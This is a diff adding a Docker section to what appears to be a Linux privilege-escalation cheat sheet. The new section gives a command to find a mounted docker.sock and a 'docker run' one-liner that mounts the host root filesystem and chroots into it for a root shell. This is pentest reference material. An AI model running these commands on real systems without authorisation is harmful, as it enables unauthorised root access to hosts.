@@ -80,3 +80,12 @@ ps aux | grep root
 
 ## Kernel Exploits  
 https://github.com/lucyoa/kernel-exploits
+
+## Docker
+If the docker socket is mounted from inside the dock container, you can eleveate to root.
+
+The sock file is generally located in `/run/docker.sock`  or you can search `find / -name docker.sock 2>/dev/null`  
+
+`docker run -it -v /:/host/ <available container images> chroot /host/ bash`  
+
+
